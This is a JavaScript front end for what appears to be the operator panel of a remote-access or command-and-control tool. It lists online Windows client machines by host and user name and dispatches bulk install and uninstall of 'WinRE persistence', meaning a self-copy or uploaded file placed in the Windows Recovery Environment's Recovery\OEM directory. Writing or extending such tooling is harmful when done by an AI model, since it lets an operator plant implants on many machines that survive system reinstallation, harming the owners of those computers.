const clientList = document.getElementById("client-list");
const clientSearch = document.getElementById("client-search");
const selectAllBtn = document.getElementById("select-all-btn");
const clearSelectionBtn = document.getElementById("clear-selection-btn");
const selectedCountSpan = document.getElementById("selected-count");
const uploadZone = document.getElementById("upload-zone");
const uploadInput = document.getElementById("upload-input");
const uploadStatus = document.getElementById("upload-status");
const installSelfBtn = document.getElementById("install-self-btn");
const installFileBtn = document.getElementById("install-file-btn");
const uninstallBtn = document.getElementById("uninstall-btn");
const outputContainer = document.getElementById("output-container");
const clearOutputBtn = document.getElementById("clear-output-btn");

const tabSelf = document.getElementById("tab-self");
const tabUpload = document.getElementById("tab-upload");
const panelSelf = document.getElementById("panel-self");
const panelUpload = document.getElementById("panel-upload");

let activeTab = "self";
let allClients = [];
let filteredClients = [];
const selectedClients = new Set();
let uploaded = null;

function switchTab(tab) {
  activeTab = tab;
  if (tab === "self") {
    tabSelf.classList.add("bg-slate-700", "text-slate-100");
    tabSelf.classList.remove("text-slate-400");
    tabUpload.classList.remove("bg-slate-700", "text-slate-100");
    tabUpload.classList.add("text-slate-400");
    panelSelf.classList.remove("hidden");
    panelUpload.classList.add("hidden");
  } else {
    tabUpload.classList.add("bg-slate-700", "text-slate-100");
    tabUpload.classList.remove("text-slate-400");
    tabSelf.classList.remove("bg-slate-700", "text-slate-100");
    tabSelf.classList.add("text-slate-400");
    panelUpload.classList.remove("hidden");
    panelSelf.classList.add("hidden");
  }
  updateButtonStates();
}

tabSelf.addEventListener("click", () => switchTab("self"));
tabUpload.addEventListener("click", () => switchTab("upload"));

async function checkAuth() {
  try {
    const res = await fetch("/api/auth/me");
    if (!res.ok) {
      window.location.href = "/";
      return;
    }

    const data = await res.json();
    document.getElementById("username-display").textContent = data.username;

    const roleBadge = document.getElementById("role-badge");
    const roleBadges = {
      admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
      operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
      viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
    };
    if (roleBadges[data.role]) {
      roleBadge.innerHTML = roleBadges[data.role];
    } else {
      roleBadge.textContent = data.role || "";
    }

    if (data.role === "admin") {
      roleBadge.classList.add("bg-purple-900/50", "text-purple-300", "border", "border-purple-800");
    } else if (data.role === "operator") {
      roleBadge.classList.add("bg-blue-900/50", "text-blue-300", "border", "border-blue-800");
    } else {
      roleBadge.classList.add("bg-slate-700", "text-slate-300", "border", "border-slate-600");
    }

    if (data.role !== "admin") {
      alert("Access denied. Admin role required.");
      window.location.href = "/";
    }
  } catch (err) {
    console.error("Auth check failed:", err);
    window.location.href = "/";
  }
}

async function loadClients() {
  try {
    const res = await fetch("/api/clients?pageSize=10000");
    if (!res.ok) throw new Error("Failed to load clients");

    const data = await res.json();
    allClients = data.items.filter(
      (c) => c.online && (c.os || "").toLowerCase().includes("windows"),
    );

    if (allClients.length === 0) {
      clientList.innerHTML =
        '<div class="p-4 text-center text-slate-500">No online Windows clients available</div>';
      return;
    }

    filterAndRenderClients();
    preselectClientFromQuery();
  } catch (error) {
    console.error("Failed to load clients:", error);
    clientList.innerHTML =
      '<div class="p-4 text-center text-red-400">Error loading clients</div>';
  }
}

function preselectClientFromQuery() {
  const params = new URLSearchParams(window.location.search);
  const targetId = params.get("clientId");
  if (!targetId) return;
  if (allClients.some((c) => c.id === targetId)) {
    selectedClients.add(targetId);
    renderClients();
  }
}

function filterAndRenderClients() {
  const searchTerm = clientSearch.value.toLowerCase();
  filteredClients = allClients.filter((c) => {
    return (
      !searchTerm ||
      (c.host && c.host.toLowerCase().includes(searchTerm)) ||
      c.id.toLowerCase().includes(searchTerm) ||
      (c.user && c.user.toLowerCase().includes(searchTerm)) ||
      (c.nickname && c.nickname.toLowerCase().includes(searchTerm))
    );
  });
  renderClients();
}

function renderClients() {
  if (filteredClients.length === 0) {
    clientList.innerHTML =
      '<div class="p-4 text-center text-slate-500">No clients match your filters</div>';
    return;
  }

  clientList.innerHTML = filteredClients
    .map((c) => {
      const name = c.host || c.id.substring(0, 8);
      const os = c.os || "unknown";
      const isSelected = selectedClients.has(c.id);

      return `
      <label class="flex items-center gap-3 px-4 py-3 hover:bg-slate-800/50 cursor-pointer border-b border-slate-800 last:border-b-0" data-client-id="${escapeHtml(c.id)}">
        <input type="checkbox" class="client-checkbox w-4 h-4 rounded border-slate-600 bg-slate-700 checked:bg-cyan-600" data-id="${escapeHtml(c.id)}" ${isSelected ? "checked" : ""}>
        <div class="flex-1 min-w-0">
          <div class="font-semibold text-slate-100 truncate">${escapeHtml(name)}</div>
          <div class="text-sm text-slate-400 flex items-center gap-2">
            <span>${escapeHtml(os)}</span>
            ${c.user ? `<span class="text-slate-500">• ${escapeHtml(c.user)}</span>` : ""}
            <span class="text-slate-600">• ${c.id.substring(0, 8)}</span>
          </div>
        </div>
        <div class="text-emerald-400 text-sm">
          <i class="fa-solid fa-circle text-xs"></i> Online
        </div>
      </label>
    `;
    })
    .join("");

  clientList.querySelectorAll(".client-checkbox").forEach((cb) => {
    cb.addEventListener("change", handleClientToggle);
  });

  updateButtonStates();
}

function handleClientToggle(e) {
  const clientId = e.target.dataset.id;
  if (e.target.checked) {
    selectedClients.add(clientId);
  } else {
    selectedClients.delete(clientId);
  }
  updateButtonStates();
}

function updateButtonStates() {
  selectedCountSpan.textContent = `${selectedClients.size} selected`;
  const hasSelection = selectedClients.size > 0;

  installSelfBtn.disabled = !hasSelection || activeTab !== "self";
  installFileBtn.disabled = !hasSelection || activeTab !== "upload" || !uploaded;
  uninstallBtn.disabled = !hasSelection;
}

function setUploadStatus(text, tone = "text-slate-400") {
  uploadStatus.className = `mt-3 text-sm ${tone}`;
  uploadStatus.textContent = text;
}

function formatBytes(bytes) {
  const value = Number(bytes) || 0;
  if (value < 1024) return `${value} B`;
  if (value < 1024 * 1024) return `${(value / 1024).toFixed(1)} KB`;
  if (value < 1024 * 1024 * 1024) return `${(value / 1024 / 1024).toFixed(2)} MB`;
  return `${(value / 1024 / 1024 / 1024).toFixed(2)} GB`;
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

clientSearch.addEventListener("input", filterAndRenderClients);

selectAllBtn.addEventListener("click", () => {
  filteredClients.forEach((c) => selectedClients.add(c.id));
  renderClients();
});

clearSelectionBtn.addEventListener("click", () => {
  selectedClients.clear();
  renderClients();
});

uploadZone.addEventListener("click", () => uploadInput.click());
uploadZone.addEventListener("dragover", (event) => {
  event.preventDefault();
  uploadZone.classList.add("border-cyan-500");
});
uploadZone.addEventListener("dragleave", () => {
  uploadZone.classList.remove("border-cyan-500");
});
uploadZone.addEventListener("drop", async (event) => {
  event.preventDefault();
  uploadZone.classList.remove("border-cyan-500");
  const file = event.dataTransfer?.files?.[0];
  if (file) await uploadFile(file);
});
uploadInput.addEventListener("change", async (event) => {
  const file = event.target.files?.[0];
  if (file) await uploadFile(file);
});

async function uploadFile(file) {
  setUploadStatus(`Uploading ${file.name}...`, "text-blue-400");
  installFileBtn.disabled = true;

  try {
    const form = new FormData();
    form.append("file", file, file.name);
    const res = await fetch("/api/winre/upload", {
      method: "POST",
      body: form,
    });

    if (!res.ok) {
      const text = await res.text();
      setUploadStatus(text || "Upload failed", "text-red-400");
      return;
    }

    const data = await res.json();
    if (!data.ok) {
      setUploadStatus(data.error || "Upload failed", "text-red-400");
      return;
    }

    uploaded = data;
    const sizeBytes = Number(data.size ?? file.size ?? 0);
    setUploadStatus(`Uploaded ${data.name} (${formatBytes(sizeBytes)})`, "text-emerald-400");
    updateButtonStates();
  } catch (error) {
    console.error("Upload failed:", error);
    setUploadStatus("Upload failed", "text-red-400");
  }
}

function renderResults(results, actionLabel) {
  const reasonLabels = {
    not_enabled: "WinRE persistence is not enabled on this client",
    unsupported: "WinRE persistence is not enabled on this client",
    windows_only: "WinRE is only supported on Windows clients",
    offline: "Client is offline",
  };
  const namedResults = results.map((r) => {
    const client = allClients.find((c) => c.id === r.clientId);
    const clientName = client ? client.host || r.clientId.substring(0, 8) : r.clientId.substring(0, 8);
    if (r.error) {
      return { clientName, clientId: r.clientId, error: r.error };
    }
    if (r.ok === false) {
      return { clientName, clientId: r.clientId, error: reasonLabels[r.reason] || r.reason || `${actionLabel} failed` };
    }
    return { clientName, clientId: r.clientId, output: `${actionLabel} dispatched` };
  });

  outputContainer.innerHTML = namedResults
    .map((r) => {
      if (r.error) {
        return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
        <div class="text-cyan-400 font-semibold mb-2">━━━ ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
        <div class="text-red-400">Error: ${escapeHtml(r.error)}</div>
      </div>`;
      }
      return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
      <div class="text-cyan-400 font-semibold mb-2">━━━ ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
      <div class="text-emerald-400">${escapeHtml(r.output)}</div>
    </div>`;
    })
    .join("");
}

installSelfBtn.addEventListener("click", async () => {
  if (selectedClients.size === 0) {
    alert("Please select at least one client");
    return;
  }

  installSelfBtn.disabled = true;
  const clientIds = Array.from(selectedClients);
  outputContainer.innerHTML = `<div class="text-blue-400">Installing WinRE persistence (self) on ${clientIds.length} client(s)...</div>`;

  let results = [];
  try {
    const res = await fetch("/api/winre/install-self", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ clientIds }),
    });

    if (!res.ok) {
      results = clientIds.map((clientId) => ({
        clientId,
        error: `HTTP error! status: ${res.status}`,
      }));
    } else {
      const data = await res.json();
      if (!data.ok) {
        results = clientIds.map((clientId) => ({
          clientId,
          error: data.error || "Unknown error",
        }));
      } else {
        results = data.results || [];
      }
    }
  } catch (error) {
    results = clientIds.map((clientId) => ({
      clientId,
      error: error.message,
    }));
  }

  renderResults(results, "WinRE Install (self)");
  installSelfBtn.disabled = false;
});

installFileBtn.addEventListener("click", async () => {
  if (selectedClients.size === 0) {
    alert("Please select at least one client");
    return;
  }

  if (!uploaded?.uploadId) {
    alert("Please upload a file first");
    return;
  }

  installFileBtn.disabled = true;
  const clientIds = Array.from(selectedClients);
  outputContainer.innerHTML = `<div class="text-blue-400">Installing WinRE persistence (file) on ${clientIds.length} client(s)...</div>`;

  let results = [];
  try {
    const res = await fetch("/api/winre/install", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        uploadId: uploaded.uploadId,
        clientIds,
      }),
    });

    if (!res.ok) {
      results = clientIds.map((clientId) => ({
        clientId,
        error: `HTTP error! status: ${res.status}`,
      }));
    } else {
      const data = await res.json();
      if (!data.ok) {
        results = clientIds.map((clientId) => ({
          clientId,
          error: data.error || "Unknown error",
        }));
      } else {
        results = data.results || [];
      }
    }
  } catch (error) {
    results = clientIds.map((clientId) => ({
      clientId,
      error: error.message,
    }));
  }

  renderResults(results, "WinRE Install (file)");
  installFileBtn.disabled = false;
});

// Uninstall WinRE persistence
uninstallBtn.addEventListener("click", async () => {
  if (selectedClients.size === 0) {
    alert("Please select at least one client");
    return;
  }

  if (!confirm("Uninstall WinRE persistence from selected clients?\n\nThis removes the entire Recovery\\OEM directory.")) {
    return;
  }

  uninstallBtn.disabled = true;
  const clientIds = Array.from(selectedClients);
  outputContainer.innerHTML = `<div class="text-blue-400">Uninstalling WinRE persistence from ${clientIds.length} client(s)...</div>`;

  let results = [];
  try {
    const res = await fetch("/api/winre/uninstall", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ clientIds }),
    });

    if (!res.ok) {
      results = clientIds.map((clientId) => ({
        clientId,
        error: `HTTP error! status: ${res.status}`,
      }));
    } else {
      const data = await res.json();
      if (!data.ok) {
        results = clientIds.map((clientId) => ({
          clientId,
          error: data.error || "Unknown error",
        }));
      } else {
        results = data.results || [];
      }
    }
  } catch (error) {
    results = clientIds.map((clientId) => ({
      clientId,
      error: error.message,
    }));
  }

  renderResults(results, "WinRE Uninstall");
  uninstallBtn.disabled = false;
});

clearOutputBtn.addEventListener("click", () => {
  outputContainer.innerHTML =
    '<div class="text-slate-500">No commands dispatched yet.</div>';
});

checkAuth();
loadClients();
